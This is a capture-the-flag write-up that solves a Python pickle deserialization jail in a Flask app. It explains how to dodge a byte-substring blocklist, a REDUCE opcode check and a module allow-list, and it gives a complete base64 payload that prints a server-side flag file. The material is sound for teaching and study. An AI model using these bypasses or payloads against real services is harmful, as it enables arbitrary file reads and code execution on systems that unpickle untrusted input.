# pickle — web / easy / 100 pts (pwnsec{})

**CTF:** PwnSec-style challenge ("Time Capsule" vault)
**Category:** Web / Python pickle deserialization jail
**Status:** SOLVED (payload built + verified locally against the exact server logic)

## Challenge

A Flask app "thaws" a base64-encoded pickle via `/restore`. It sanitises the
payload before unpickling:

- **Banned byte-substrings** anywhere in the raw pickle:
  `.`, `os`, `system`, `popen`, `subprocess`, `commands`, `exec`, `eval`,
  `import`, `getattr`, `setattr`, `flag`
- **Banned opcode**: `REDUCE` — rejected if it appears in `pickletools.dis()` output.
- **Restricted unpickler**: `find_class` only allows modules whose top-level name is
  `sessionstore` or `collections`.
- The unpickle runs inside `contextlib.redirect_stdout(buf)`, and `buf` is returned as
  `output`. **So the goal is to PRINT the flag during unpickling.**
- Flag is at `/app/flag.txt`.

## Key insights

1. **The STOP opcode is `.` (0x2e) — a banned byte.** A normal pickle ends with STOP, so
   *any* well-formed pickle is rejected outright. The pickle **must omit STOP**.

2. **Omitting STOP also crashes `pickletools.dis()`** ("pickle exhausted before seeing
   STOP" → ValueError). The server wraps `dis()` in `try/except Exception: disassembled =
   "Error!"`, so the crash silently sets `disassembled="Error!"` and the
   `if "REDUCE" in disassembled` check never triggers. **The entire REDUCE ban is
   bypassed.** Meanwhile `Unpickler.load()` executes opcodes *as it reads them* (side
   effects happen before it hits end-of-stream and raises, which is swallowed by the
   server's `try/except pass`).

3. **Reaching `builtins` through the allowed `collections` module, with no dots and no
   `getattr`:**
   - `find_class("collections", "__builtins__")` → `getattr(collections, "__builtins__")`
     returns the **builtins dict** (modules keep `__builtins__` in their `__dict__`).
     The string `__builtins__` contains no `.` and no banned word.
   - `collections._itemgetter` is `operator.itemgetter`. `itemgetter(k)(builtins_dict)`
     = `builtins_dict[k]`, giving us `open`, `list`, `print` (none banned).

4. **Filename obfuscation:** `/app/flag.txt` contains `flag` and `.` (both banned). Use
   the protocol-0 `STRING` opcode with `\xNN` escapes: the *decoded* string is
   `/app/flag.txt`, but the raw bytes are `S'/app/\x66\x6c\x61\x67\x2e\x74\x78\x74'` —
   no literal `flag` and no `0x2e` byte.

5. **Read + print without `.read`/`getattr`:** `print(list(open(path)))`.
   `list(fileobj)` iterates the file into a list of lines; `print` writes to the
   redirected stdout → captured in `output`.

## Payload construction

Stack machine (no STOP):
```
build builtins_dict['print']   # via itemgetter('print')(collections.__builtins__)
build builtins_dict['list']
build builtins_dict['open']
push '/app/flag.txt'           # \x-escaped STRING
TUPLE1 ; REDUCE                # open(path) -> file
TUPLE1 ; REDUCE                # list(file) -> lines
TUPLE1 ; REDUCE                # print(lines)   (prints flag)
# (no STOP)
```

`build builtins_dict[k]`:
```
ccollections\n_itemgetter\n      # GLOBAL operator.itemgetter  (NOTE: no space after 'c')
( S'<k \x-escaped>' t R          # itemgetter(k)
( ccollections\n__builtins__\n t R   # itemgetter(k)(builtins_dict) = builtins_dict[k]
```

**Gotcha:** the GLOBAL opcode is `c` immediately followed by the module name — do NOT
write `c collections` (the space makes the module `" collections"` which fails the
allow-list).

## Final payload (base64) — paste into the vault textarea

```
Y2NvbGxlY3Rpb25zCl9pdGVtZ2V0dGVyCihTJ1x4NzBceDcyXHg2OVx4NmVceDc0Jwp0UihjY29sbGVjdGlvbnMKX19idWlsdGluc19fCnRSY2NvbGxlY3Rpb25zCl9pdGVtZ2V0dGVyCihTJ1x4NmNceDY5XHg3M1x4NzQnCnRSKGNjb2xsZWN0aW9ucwpfX2J1aWx0aW5zX18KdFJjY29sbGVjdGlvbnMKX2l0ZW1nZXR0ZXIKKFMnXHg2Zlx4NzBceDY1XHg2ZScKdFIoY2NvbGxlY3Rpb25zCl9fYnVpbHRpbnNfXwp0UihTJ1x4MmZceDYxXHg3MFx4NzBceDJmXHg2Nlx4NmNceDYxXHg2N1x4MmVceDc0XHg3OFx4NzQnCnRShVKFUg==
```

Or: `python send.py https://<instance>` → prints the flag.

## Lessons

- When a deserialization jail bans an *opcode string* from a disassembler, look for ways
  to make the disassembler **crash** — `except: pass`-style handlers turn a crash into a
  silent bypass of the whole check.
- Banning the `.` byte is a strong hint about the STOP opcode (`.`) and about blocking
  dotted attribute traversal (`_getattribute`) in `STACK_GLOBAL`.
- A module's `__builtins__` entry is a clean, dot-free bridge from an allow-listed module
  to full builtins; `operator.itemgetter` (re-exported as `collections._itemgetter`)
  provides subscripting to pull callables out of it.
- Protocol-0 `STRING` with `\xNN` escapes defeats raw-byte substring filters.
- Read this challenge's description/constraints literally — the banned list *is* the map
  of the intended bypasses.
